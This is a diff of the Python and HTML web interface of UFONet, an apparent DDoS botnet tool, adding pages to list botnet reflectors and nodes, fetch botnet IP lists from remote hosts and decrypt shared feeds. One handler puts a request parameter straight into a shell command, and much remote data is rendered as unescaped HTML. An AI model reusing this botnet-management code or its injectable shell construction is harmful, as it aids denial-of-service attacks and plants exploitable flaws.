+</tr>
+</table> </td></tr></table>
+""" + self.pages["/footer"]
 
-       - <i>git clone <a href="https://code.03c8.net/epsylon/ufonet" target="_blank">https://code.03c8.net/epsylon/ufonet</a></i>
-       - <i>git clone <a href="https://github.com/epsylon/ufonet" target="_blank">https://github.com/epsylon/ufonet</a></i>
-</div><div>
-<a id="mH5" href="javascript:show('nb5');" style="text-decoration: none;" >+ FAQ/Issues?</a></div><div class="nb" id="nb5" style="display: none;">
-  If you have problems with UFONet, try to solve them following next links:
+        self.pages["/author"] = self.pages["/header"] + """<style>.container{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;}svg{max-width:8rem;}.masking{-webkit-transform: scale(0);transform:scale(0);-webkit-transform-origin:178px;transform-origin:178px;-webkit-animation: scale 3s linear infinite; animation: scale 3s linear infinite;}@-webkit-keyframes scale{80%{opacity: 1;}100%{-webkit-transform: scale(1);transform: scale(1);opacity: 0;}}@keyframes scale{80% {opacity: 1;}100%{-webkit-transform: scale(1);transform: scale(1);opacity: 0;}}</style>
+</head>
+<body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
+<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
+<center>
 
-      - <a href="https://ufonet.03c8.net/FAQ.html" target="_blank">Website FAQ</a> section
-      - UFONet <a href="https://github.com/epsylon/ufonet/issues" target="_blank">issues</a></div>
-<div><a id="mH6" href="javascript:show('nb6');" style="text-decoration: none;" >+ How can help?</a></div> <div class="nb" id="nb6" style="display: none;">      - Testing; use the tool and search for possible bugs and new ideas
-      - Coding; you can try to develop more features
-      - Promoting; talk about UFONet on the internet, events, hacklabs, etc
-      - Donating; <a href="https://blockchain.info/address/19aXfJtoYJUoXEZtjNwsah2JKN9CK5Pcjw" target="_blank">bitcoin</a>, objects, support, love ;-)</div> <div><a id="mH7" href="javascript:show('nb7');" style="text-decoration: none" >+ Contact methods</a></div> <div class="nb" id="nb7" style="display: none;">  You can contact using:
-   
-      - Email: <a href="mailto: epsylon@riseup.net">epsylon@riseup.net</a> [GPG:0xB8AC3776]
-      - <a target="_blank" href="wormhole">Wormhole</a>: irc.freenode.net / #ufonet
-</div></td> </tr></table> </td></tr></table>
+<table cellpadding="38" cellspacing="38">
+<tr>
+ <td>
+<table cellpadding="24" cellspacing="25" border="1">
+<tr>
+ <td><pre>"""+self.author_text+"""</pre></td>
+</tr>
+</table>
+</td></tr></table>
+""" + self.pages["/footer"]
+
+        self.pages["/treemap"] = self.pages["/header"] + """<style>.container{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;}svg{max-width:8rem;}.masking{-webkit-transform: scale(0);transform:scale(0);-webkit-transform-origin:178px;transform-origin:178px;-webkit-animation: scale 3s linear infinite; animation: scale 3s linear infinite;}@-webkit-keyframes scale{80%{opacity: 1;}100%{-webkit-transform: scale(1);transform: scale(1);opacity: 0;}}@keyframes scale{80% {opacity: 1;}100%{-webkit-transform: scale(1);transform: scale(1);opacity: 0;}}</style>
+</head>
+<body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
+<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
+<table cellpadding="38" cellspacing="38">
+<tr>
+ <td>
+<div>
+<link type="text/css" href="js/treemap.css" rel="stylesheet" />
+<script language="javascript" type="text/javascript" src="js/jit.js"></script>
+<script language="javascript" type="text/javascript" src="js/treemap.js"></script>
+ <div id="infovis"></div>    
+</div>
+</td></tr></table><center>
 """ + self.pages["/footer"]
 
         self.pages["/inspect"] = self.pages["/header"] + """<script language="javascript"> 
 function Requests() {
         var win_requests = window.open("requests","_blank","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
-      }
-function Abduction() {
-        var win_requests = window.open("abduction","_blank","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
       }
 function Start(){
         target=document.getElementById("target").value
@@ -3385,15 +3662,6 @@ function Start(){
 <table cellpadding="38" cellspacing="38">
 <tr>
  <td>
-<div class="ringMenu">
-<ul>
-  <li class="main"><a href="inspect">Inspect</a></li>
-  <li class="top"><a href="help">Help</a></li>
-  <li class="right"><a href="botnet">Botnet</a></li>
-  <li class="bottom"><a href="attack">Attack</a></li>
-  <li class="left"><a href="gui">RETURN</a></li>
-</ul>
-</div>
  </td>
  <td>
 	<table bgcolor="black" cellpadding="24" cellspacing="25" border="1">
@@ -3406,18 +3674,13 @@ function Start(){
   <button title="Configure how you will perform requests (proxy, HTTP headers, etc)..." onclick="Requests()">Configure requests</button> 
 
 <hr>
-  * Set page to crawl: <input type="text" name="target" id="target" size="30" placeholder="http(s)://target.com/list_videos.php">
+  Set page to crawl: <input type="text" name="target" id="target" size="30" placeholder="http(s)://target.com/list_videos.php">
 
 <hr>
    <button title="Start to search for biggest file on your target..." onClick=Start() style="color:yellow; height:40px; width:240px; font-weight:bold; background-color:red; border: 2px solid yellow;">INSPECT!</button></pre>
-</td><td><table><tr><td><img src='data:image/png;base64,"""+self.alien7_img+"""' onclick="Abduction()"></td></tr><tr><td align="right"><a href="javascript:Abduction()">ABDUCTION!</a></td></tr></table></td>
-</tr></table>
- </td>
-</tr>
-</table>
-<hr>
-<div id="cmdOut"></div>
-""" + self.pages["/footer"]
+</td></tr></table>
+<br><br><hr><br>
+<div id="cmdOut"></div><center>""" + self.pages["/footer"]
 
         self.pages["/ranking"] = self.pages["/header"] + """<script language="javascript">
 function Grid() {
@@ -3454,7 +3717,7 @@ function Sync_ranking(){
 <center>
 <table bgcolor="black" cellpadding="24" cellspacing="25" border="0"><tr>
   <td><a href="javascript:alert('Commander DPR says: I love new blood!! """ + self.ranking + """, in the Ranking section you can see information about how to raise your grade, meet the best UFOMasters, be close to those who are like you and try to find partners to dominate the multi-verse... Until then: Dont be evil!');"><img src='data:image/png;base64,"""+self.commander_img+"""'></a></td>
-  <td>GRADUATION/CLANS device: <font color='green'>ON</font><br><br><button title="Review stats from other motherships and share yours with them..." onclick="Grid()">VISIT GRID!</button> <button title="Visit your own stats..." onclick="Stats()">VISIT STATS!</button><br><br><button title="Visit board panel..." onclick="Board()">VISIT BOARD!</button> <button title="Visit data links..." onclick="Links()">VISIT LINKS!</button> <button title="Visit TV.streams..." onclick="Streams()">VISIT STREAMS!</button></td>
+  <td>GRADUATION/CLANS device: <font color='green'>ON</font><br><br><button title="Review stats from other motherships and share yours with them..." onclick="Grid()">VISIT GRID!</button> <button title="Visit your own stats..." onclick="Stats()">VISIT STATS!</button><br><br><button title="Visit board panel..." onclick="Board()">VISIT BOARD!</button> <button title="Visit data links..." onclick="Links()">VISIT LINKS!</button> <button title="Visit Streams..." onclick="Streams()">VISIT STREAMS!</button></td>
 </tr></table>
 <table cellpadding="5" cellspacing="10">
 <tr>
@@ -3591,10 +3854,10 @@ function runCommandX(cmd,params) {
                                 document.getElementById("cmdOut").innerHTML = xmlhttp.responseText;
                                 //document.getElementById("cmdOut").scrollIntoView();
                                 newcmd=cmd
-                                if(newcmd=="cmd_list_army"||newcmd=="cmd_view_army"||newcmd=="cmd_list_zombies"||newcmd=="cmd_list_aliens"|| newcmd=="cmd_list_droids"||newcmd=="cmd_list_ucavs"||newcmd=="cmd_list_rpcs"||newcmd=="cmd_view_changelog"){ //do not refresh listing army
+                                if(newcmd=="cmd_list_army"||newcmd=="cmd_list_nodes"||newcmd=="cmd_view_army"||newcmd=="cmd_list_zombies"||newcmd=="cmd_list_aliens"|| newcmd=="cmd_list_droids"||newcmd=="cmd_list_ucavs"||newcmd=="cmd_list_rpcs"||newcmd=="cmd_view_changelog"){ //do not refresh listing army
                                     return;
                                 } else {
-                                if(newcmd=="cmd_test_army" || newcmd=="cmd_test_all" || newcmd=="cmd_test_offline" || newcmd=="cmd_test_rpcs" || newcmd=="cmd_attack" || newcmd=="cmd_refresh_blackholes" || newcmd=="cmd_refresh_news" || newcmd=="cmd_refresh_missions" || newcmd=="cmd_sync_grid" || newcmd=="cmd_sync_board" || newcmd=="cmd_sync_wargames" || newcmd=="cmd_sync_links" || newcmd=="cmd_sync_globalnet" || newcmd=="cmd_sync_streams" || newcmd=="cmd_send_message_board" || newcmd=="cmd_transfer_grid" || newcmd=="cmd_transfer_wargame" || newcmd=="cmd_transfer_link" || newcmd=="cmd_transfer_globalnet" || newcmd=="cmd_transfer_stream" || newcmd=="cmd_decrypt" || newcmd=="cmd_decrypt_moderator_board" || newcmd=="cmd_decrypt_grid" || newcmd=="cmd_decrypt_wargames" || newcmd=="cmd_decrypt_links" || newcmd=="cmd_decrypt_globalnet" || newcmd=="cmd_decrypt_streams" || newcmd=="cmd_inspect" || newcmd=="cmd_abduction" || newcmd=="cmd_download_community" || newcmd=="cmd_upload_community" || newcmd=="cmd_attack_me" || newcmd=="cmd_check_tool" || newcmd=="cmd_edit_supply" || newcmd=="cmd_job_remove" || newcmd=="cmd_job_remove_all" || newcmd=="cmd_job_add" || newcmd =="cmd_job_add_all" || newcmd=="cmd_job_cancel" || newcmd=="cmd_job_cancel_all" || newcmd=="cmd_job_filter" || newcmd=="cmd_link_filter" || newcmd=="cmd_globalnet_filter" || newcmd=="cmd_stream_filter" || newcmd=="cmd_grid_filter" || newcmd=="cmd_search") newcmd=newcmd+"_update"
+                                if(newcmd=="cmd_test_army" || newcmd=="cmd_test_all" || newcmd=="cmd_test_offline" || newcmd=="cmd_test_rpcs" || newcmd=="cmd_attack" || newcmd=="cmd_refresh_blackholes" || newcmd=="cmd_refresh_news" || newcmd=="cmd_refresh_tv" || newcmd=="cmd_refresh_missions" || newcmd=="cmd_sync_grid" || newcmd=="cmd_sync_board" || newcmd=="cmd_sync_wargames" || newcmd=="cmd_sync_links" || newcmd=="cmd_sync_globalnet" || newcmd=="cmd_sync_streams" || newcmd=="cmd_send_message_board" || newcmd=="cmd_transfer_grid" || newcmd=="cmd_transfer_wargame" || newcmd=="cmd_transfer_link" || newcmd=="cmd_transfer_globalnet" || newcmd=="cmd_transfer_stream" || newcmd=="cmd_decrypt" || newcmd=="cmd_decrypt_moderator_board" || newcmd=="cmd_decrypt_grid" || newcmd=="cmd_decrypt_wargames" || newcmd=="cmd_decrypt_links" || newcmd=="cmd_decrypt_globalnet" || newcmd=="cmd_decrypt_streams" || newcmd=="cmd_decrypt_tv" || newcmd=="cmd_inspect" || newcmd=="cmd_abduction" || newcmd=="cmd_download_community" || newcmd=="cmd_upload_community" || newcmd=="cmd_download_botnet_ip" || newcmd=="cmd_attack_me" || newcmd=="cmd_check_tool" || newcmd=="cmd_edit_supply" || newcmd=="cmd_job_remove" || newcmd=="cmd_job_remove_all" || newcmd=="cmd_job_add" || newcmd =="cmd_job_add_all" || newcmd=="cmd_job_cancel" || newcmd=="cmd_job_cancel_all" || newcmd=="cmd_job_filter" || newcmd=="cmd_link_filter" || newcmd=="cmd_globalnet_filter" || newcmd=="cmd_stream_filter" || newcmd=="cmd_grid_filter" || newcmd=="cmd_search") newcmd=newcmd+"_update"
 								//do not refresh if certain text on response is found
 								if(newcmd.match(/update/) && 
 										(
@@ -3803,6 +4066,41 @@ function runCommandX(cmd,params) {
            self.pages["/cmd_view_changelog"] = "</center><pre>"+str(changelog)+"<br /><br/>"
         if page == "/cmd_list_army":
             self.pages["/cmd_list_army"] = "<pre><h1>Total Botnet = "+self.total_botnet+"</h1><table cellpadding='10' cellspacing='10' border='1'><tr><td>UCAVs:</td><td>"+self.num_ucavs+"</td><td>Aliens:</td><td>"+self.num_aliens+"</td></tr><tr><td>Droids:</td><td>"+self.num_droids+"</td><td>Zombies:</td><td>"+self.num_zombies+"</td></tr><tr><td>XML-RPCs:</td><td>"+self.num_rpcs+" </td><td>NTPs:</td><td>"+self.num_ntps+"</td></tr><tr><td>DNSs:</td><td>"+self.num_dnss+"</td><td>SNMPs:</td><td>"+self.num_snmps+"</td></tr></table> <hr><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>UCAVs:</u> <b>"+self.num_ucavs+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.ucavs_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_ucavs)+"</td><td></h3>"+'\n'.join(self.ucavs)+"</td></tr></table><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>Aliens:</u> <b>"+self.num_aliens+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.aliens_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_aliens)+"</td><td></h3>"+'\n'.join(self.aliens)+"</td></tr></table><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>Droids:</u> <b>"+self.num_droids+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.droids_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_droids)+"</td><td></h3>"+'\n'.join(self.droids)+"</td></tr></table><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>Zombies:</u> <b>"+self.num_zombies+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.zombies_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_zombies)+"</td><td></h3>"+'\n'.join(self.zombies)+"</td></tr></table><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>XML-RPCs:</u> <b>"+self.num_rpcs+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.rpcs_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_rpcs)+"</td><td></h3>"+'\n'.join(self.rpcs)+"</td></tr></table><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>NTPs:</u> <b>"+self.num_ntps+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.ntps_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_ntps)+"</td><td></h3>"+'\n'.join(self.ntps)+"</td></tr></table><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>DNSs:</u> <b>"+self.num_dnss+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.dnss_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_dnss)+"</td><td></h3>"+'\n'.join(self.dnss)+"</td></tr></table><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>SNMPs:</u> <b>"+self.num_snmps+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.snmps_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_snmps)+"</td><td></h3>"+'\n'.join(self.snmps)+"</td></tr></table><br /><br/>"
+        if page == "/cmd_list_nodes":
+            self.dec_list_blackholes = []
+            self.decrypted_blackholes = []
+            for blackholes_text in self.list_blackholes:
+                self.decrypt(crypto_key, blackholes_text)
+                if self.decryptedtext:
+                    self.dec_list_blackholes.append(self.decryptedtext)
+                self.decryptedtext = "" # clean decryptedtext buffer
+            num_blackholes = 0 # blackholes nodes counter
+            for b in self.dec_list_blackholes:
+                num_blackholes = num_blackholes + 1
+                s = b.rsplit(blackhole_sep, 1)[0]
+                ip_b = str(s.rsplit(blackhole_sep, 1)[0].rsplit(":", 1)[1])
+                self.decrypted_blackholes.append(ip_b)
+            self.decrypted_globalnet = []
+            with open(self.globalnet_file) as f:
+                ls = f.read().splitlines()
+            f.close()
+            num_globalnet = 0 # globalnet nodes counter
+            for j in ls:
+                if globalnet_msg_sep in j:
+                    m = j.split(globalnet_msg_sep)
+                    globalnet_ip = m[3] # ip
+                    self.decrypt(crypto_key, globalnet_ip)
+                    if self.decryptedtext:
+                        num_globalnet = num_globalnet + 1
+                        ip_g = self.decryptedtext
+                        self.decrypted_globalnet.append(ip_g)
+                    self.decryptedtext = "" # clean decryptedtext buffer
+            if num_blackholes == 0:
+                ip_b = "-"
+            if num_globalnet == 0:
+                ip_g = "-"
+            total_nodes = str(num_blackholes + num_globalnet)
+            self.pages["/cmd_list_nodes"] = "<pre><h1>Total Nodes = "+str(total_nodes)+"</h1><br /><div id='infovis'></div><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u><a href='/radar' target='_blank'>GLOBAL.RADAR:</u></a> <b>"+str(num_globalnet)+"</b></td><td><h3><u><a href='/blackholes' target='_blank'>SHIP.WARPS:</u></a> <b>"+str(num_blackholes)+"</b></td></tr><tr><td></h3>"+'\n'.join(self.decrypted_globalnet)+"</td><td></h3>"+'\n'.join(self.decrypted_blackholes)+"</td></tr></table><br /><br/>"
         if page == "/cmd_list_zombies":
             self.pages["/cmd_list_zombies"] = "<pre><h1>Total Zombies = "+self.num_zombies+"</h1><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>Zombies:</u> <b>"+self.num_zombies+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.zombies_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_zombies)+"</td><td></h3>"+'\n'.join(self.zombies)+"</td></tr></table><br /><br/>"
         if page == "/cmd_list_aliens":
@@ -3850,6 +4148,16 @@ function runCommandX(cmd,params) {
                 open('/tmp/out', 'w').close()
             with open('/tmp/out', 'r') as f:
                 self.pages["/cmd_download_community_update"] = "<pre>"+f.read()+"<pre>"
+        if page == "/cmd_download_botnet_ip":
+            blackhole = pGet["blackhole"]
+            blackhole=urllib.parse.unquote(blackhole)
+            self.pages["/cmd_download_botnet_ip"] = "<pre>Waiting for downloading results...</pre>"
+            runcmd = "("+python_version+" -i ufonet --down-from '"+blackhole+"' "+ cmd_options + "|tee /tmp/out) &"
+        if page == "/cmd_download_botnet_ip_update":
+            if not os.path.exists('/tmp/out'):
+                open('/tmp/out', 'w').close()
+            with open('/tmp/out', 'r') as f:
+                self.pages["/cmd_download_botnet_ip_update"] = "<pre>"+f.read()+"<pre>"
         if page == "/cmd_upload_community":
             self.pages["/cmd_upload_community"] = "<pre>Waiting for uploading results...</pre>"
             runcmd = "("+python_version+" -i ufonet --upload-zombies "+ cmd_options + "|tee /tmp/out) &"
@@ -4056,6 +4364,28 @@ function runCommandX(cmd,params) {
                 open('/tmp/out', 'w').close()
             with open('/tmp/out', 'r') as f:
                 self.pages["/cmd_refresh_news_update"] = "<pre>"+f.read()+"<pre>"
+        if page == "/cmd_refresh_tv":
+            self.pages["/cmd_refresh_tv"] = "<pre>Waiting for 'blackhole' reply...</pre>"
+            blackhole_ip = pGet["tv_source"]
+            blackhole_ip = urllib.parse.unquote(blackhole_ip)
+            try:
+                tv = urllib.request.urlopen('http://'+blackhole_ip+'/ufonet/tv.txt').read().decode('utf-8')
+                f = open(self.tv, "w") # write updates to tv.txt
+                f.write(tv)
+                f.close()
+                self.tv_text = tv
+            except:
+                tv = "[Error] [AI] Something wrong downloading. Try it again or using another source....\n"
+            end_mark = "\n[Info] [AI] End of TV feed. -> [Refreshing!]"
+            f = open("/tmp/out", "w")
+            f.write(str(tv))
+            f.write(end_mark)
+            f.close()
+        if page == "/cmd_refresh_tv_update":
+            if not os.path.exists('/tmp/out'):
+                open('/tmp/out', 'w').close()
+            with open('/tmp/out', 'r') as f:
+                self.pages["/cmd_refresh_tv_update"] = "<pre>"+f.read()+"<pre>"
         if page == "/cmd_sync_wargames":
             self.pages["/cmd_sync_wargames"] = "<pre>Waiting for 'blackhole' reply...</pre>"
             blackhole_ip = pGet["wargames_source"]
@@ -6159,6 +6489,8 @@ function runCommandX(cmd,params) {
                 self.pages["/cmd_decrypt_update"] = "<pre>"+f.read()+"<pre>"
         if page == "/news":
             self.pages["/news"] = self.html_news()
+        if page == "/tv":
+            self.pages["/tv"] = self.html_tv()
         if page == "/missions":
             self.pages["/missions"] = self.html_missions()
         if page == "/board":
@@ -6177,8 +6509,8 @@ function runCommandX(cmd,params) {
             self.pages["/spaceinvaders"] = self.html_spaceinvaders()
         if page == "/browser":
             self.pages["/browser"] = self.html_browser()
-        if page == "/globalnet":
-            self.pages["/globalnet"] = self.html_globalnet()
+        if page == "/radar":
+            self.pages["/radar"] = self.html_globalnet()
         if page == "/grid_profile":
             if pGet=={}:
                 self.pages["/grid_profile"] = self.html_grid_profile()
@@ -7182,7 +7514,7 @@ function runCommandX(cmd,params) {
                 link_deckey = ""
             end_mark = "[Info] [AI] End of decryption."
             if link_deckey != "": # links decryption
-                nodec_text = "KEY?"
+                nodec_text = "This LINK cannot be solved with that KEY..."
                 links_table = "<table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><a id='filter_creation' style='color:red;text-decoration:underline red;' onclick=javascript:LinkFilter('creation','"+str(link_deckey)+"');>CREATION:</a></td><td align='center'><a id='filter_topic' style='color:red;text-decoration:underline red;' onclick=javascript:LinkFilter('topic','"+str(link_deckey)+"')>TOPIC:</a></td><td align='center'><a id='filter_url' style='color:red;text-decoration:underline red;' onclick=javascript:LinkFilter('url','"+str(link_deckey)+"')>URL:</a></td></tr>"
                 f = open("/tmp/out", "w")
                 self.list_links_rev = reversed(self.list_links) # order by DESC
@@ -7213,8 +7545,13 @@ function runCommandX(cmd,params) {
                             link_topic = nodec_text
                         self.decryptedtext = "" # clean decryptedtext buffer
                     else:
-                        link_url = "KEY?"
-                    links_table += "<tr><td align='center'>"+link_creation+"</td><td align='center'>"+link_topic+"</td><td align='center'><a href='"+str(link_url)+"' target='_blank'>"+str(link_url)+"</a></td></tr>"
+                        link_creation = nodec_text
+                        link_url = nodec_text
+                        link_topic = nodec_text
+                    if link_creation == nodec_text:
+                        links_table += "<tr><td align='center'>KEY?</td><td align='center'>"+nodec_text+"</td><td align='center'>KEY?</td></tr>"
+                    else:
+                        links_table += "<tr><td align='center'>"+link_creation+"</td><td align='center'>"+link_topic+"</td><td align='center'><a href='"+str(link_url)+"' target='_blank'>"+str(link_url)+"</a></td></tr>"
                 links_table += "</table><br>"
                 f.write(links_table)
                 f.write(end_mark)
@@ -7232,7 +7569,7 @@ function runCommandX(cmd,params) {
                 stream_deckey = ""
             end_mark = "[Info] [AI] End of decryption."
             if stream_deckey != "": # streams decryption
-                nodec_text = "KEY?"
+                nodec_text = "This STREAM cannot be solved with that KEY..."
                 streams_table = "<table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><a id='filter_creation' style='color:red;text-decoration:underline red;' onclick=javascript:StreamFilter('creation','"+str(stream_deckey)+"');>CREATION:</a></td><td align='center'><a id='filter_topic' style='color:red;text-decoration:underline red;' onclick=javascript:StreamFilter('topic','"+str(stream_deckey)+"')>TOPIC:</a></td><td align='center'><a id='filter_url' style='color:red;text-decoration:underline red;' onclick=javascript:StreamFilter('url','"+str(stream_deckey)+"')>STREAM:</a></td><td align='center'>VIDEO:</td></tr>"
                 f = open("/tmp/out", "w")
                 self.list_streams_rev = reversed(self.list_streams) # order by DESC
@@ -7266,9 +7603,14 @@ function runCommandX(cmd,params) {
                         stream_id = str(stream_url.split("v=")[1]) # extract (Youtube) VideoID
                         stream_num = stream_num + 1
                     else:
-                        stream_url = "KEY?"
+                        stream_creation = nodec_text
+                        stream_url = nodec_text
+                        stream_topic = nodec_text
                         stream_id = None
-                    streams_table += "<tr><td align='center'>"+stream_creation+"</td><td align='center'>"+stream_topic+"</td><td align='center'><a href='"+str(stream_url)+"' target='_blank'>"+str(stream_url)+"</a></td><td align='center'><button id='play_button_"+str(stream_num)+"' value='"+str(stream_id)+"' onclick='PlayStream("+str(stream_num)+");return false;'>PLAY!</button><div id='video_"+str(stream_num)+"'></div></td></tr>"
+                    if stream_creation == nodec_text:
+                        streams_table += "<tr><td align='center'>KEY?</td><td align='center'>"+nodec_text+"</td><td align='center'>KEY?</td><td align='center'>KEY?</td></tr>"
+                    else:
+                        streams_table += "<tr><td align='center'>"+stream_creation+"</td><td align='center'>"+stream_topic+"</td><td align='center'><a href='"+str(stream_url)+"' target='_blank'>"+str(stream_url)+"</a></td><td align='center'><button id='play_button_"+str(stream_num)+"' value='"+str(stream_id)+"' onclick='PlayStream("+str(stream_num)+");return false;'>PLAY!</button><div id='video_"+str(stream_num)+"'></div></td></tr>"
                 streams_table += "</table><br>"
                 f.write(streams_table)
                 f.write(end_mark)
@@ -7278,6 +7620,74 @@ function runCommandX(cmd,params) {
                 open('/tmp/out', 'w').close()
             with open('/tmp/out', 'r') as f:
                 self.pages["/cmd_decrypt_streams_update"] = "<pre>"+f.read()+"<pre>"
+        if page == "/cmd_decrypt_tv":
+            self.pages["/cmd_decrypt_tv"] = "<pre>Waiting for decrypting results...</pre>"
+            try:
+                tv_deckey = pGet["tv_deckey"]
+            except:
+                tv_deckey = ""
+            end_mark = "[Info] [AI] End of decryption."
+            if tv_deckey != "": # tv decryption
+                nodec_text = "*** [This TV.PEER cannot be solved with that KEY...]"
+                self.playlist = []
+                self.list_tv_rev = reversed(self.list_tv) # order by DESC
+                if self.list_tv:
+                    tv_table = '<table cellpadding="35" cellspacing="35" border="1"><tr><td><u>PLAYLIST:</u><br><br><ul>'
+                else:
+                    tv_table = '<table border="0"><tr><td>Never connected to any feed...</u><ul>'
+                f = open("/tmp/out", "w")
+                tv_num = 0
+                self.playing_title = ""
+                for n in self.list_tv_rev: # list = url
+                    url_tv = n # url
+                    try:
+                        self.decrypt(tv_deckey, url_tv)
+                        if self.decryptedtext:
+                            url_tv = self.decryptedtext
+                            if url_tv != "1": # black magic!
+                                self.playlist.append(url_tv)
+                            else:
+                                url_tv = nodec_text
+                        else:
+                            url_tv = nodec_text
+                    except:
+                        url_tv = nodec_text
+                    self.decryptedtext = "" # clean decryptedtext buffer
+                    if url_tv != nodec_text:
+                        if url_tv.endswith(".ogv"): # remote .ogv
+                            o = urlparse(url_tv)
+                            start = '/'
+                            end = '.ogv'
+                            s = o.path
+                            r = re.compile(start+'(.*?)'+end)
+                            m = r.search(s)
+                            if m:
+                                self.playing_title = m.group(1).split("/")[1]
+                        tv_table += "<table><tr><td>[<a href='#' onclick=PlayTV('"+str(url_tv)+"')>PLAY!</a>]</td><td><a href='"+str(url_tv)+"' target='_blank'>"+str(self.playing_title)+"</a></td></tr></table>"
+                    else:
+                        tv_table +="<li>"+str(nodec_text)+"</li>"
+                if self.playlist: # random play one video from playlist | autostart - controls - preload - allowfullscreen
+                    playlist_now = random.choice(self.playlist)
+                    if playlist_now.endswith(".ogv"): # remote .ogv
+                        o = urlparse(playlist_now)
+                        start = '/'
+                        end = '.ogv'
+                        s = o.path
+                        r = re.compile(start+'(.*?)'+end)
+                        m = r.search(s)
+                        if m:
+                            self.playing_title_now = m.group(1).split("/")[1]
+                        tv_table += "</ul></td></tr><tr><td><u>WATCHING:</u> <a id='tv_a' href='"+str(playlist_now)+"' target='_blank'><label id='tv_p'>"+str(self.playing_title_now)+"</label></a><br><br><video id='player' controls width='100%' height='480' preload='auto' autoplay><source id='tv_stream_source' src='"+str(playlist_now)+"' type='video/ogg' />Sorry, your browser doesn’t support HTML5 media.</video></td></tr></table><br>"
+                else:
+                    tv_table += "</ul></td></tr></table><br>"
+                f.write(tv_table)
+                f.write(end_mark)
+                f.close()
+        if page == "/cmd_decrypt_tv_update":
+            if not os.path.exists('/tmp/out'):
+                open('/tmp/out', 'w').close()
+            with open('/tmp/out', 'r') as f:
+                self.pages["/cmd_decrypt_tv_update"] = "<pre>"+f.read()+"<pre>"
         if page == "/cmd_decrypt_globalnet":
             self.pages["/cmd_decrypt_globalnet"] = "<pre>Waiting for decrypting results...</pre>"
             try:
